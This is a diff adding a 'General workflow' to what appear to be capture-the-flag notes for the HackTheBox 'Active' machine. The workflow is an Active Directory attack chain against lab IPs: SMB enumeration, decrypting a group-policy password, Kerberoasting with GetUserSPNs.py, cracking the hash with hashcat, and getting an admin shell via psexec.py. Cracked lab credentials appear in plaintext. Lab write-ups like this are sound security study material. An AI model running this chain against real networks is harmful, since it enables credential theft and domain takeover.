@@ -17,13 +17,27 @@ Tools to request and export the TGS ticket hashes in a hashcat-compatible format
 Hashcat cheat sheet:
 - https://www.blackhillsinfosec.com/hashcat-cheatsheet/
 
+Hashcat example hashes
+- https://hashcat.net/wiki/doku.php?id=example_hashes
+
 ** Bloodhound **
 - Sharphound.exe
 - Sharphound.ps1
 - Sharphound.exe -c all -d active.htb --domain-controller 10.129.6.212
 
-Hashcat example hashes
-- https://hashcat.net/wiki/doku.php?id=example_hashes
+
+General workflow:
+smbmap -H //10.129.4.158
+smbclient //10.129.4.158/Replication -R
+gpp-decrypt
+    smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.6.212 -R Users
+    psexec.py active.htb/svc_tgs@10.129.6.212
+GetUserSPNs.py -request active.htb/SVC_TGS -dc-ip 10.129.6.224
+hashcat -a 0 -m 13100 admin.hash /usr/share/wordlists/rockyou.txt.gz 
+    smbclient //10.129.6.224/Users -U active.htb/Administrator%Ticketmaster1968
+    psexec.py active.htb/Administrator@10.129.6.212
+
+
 
 
 
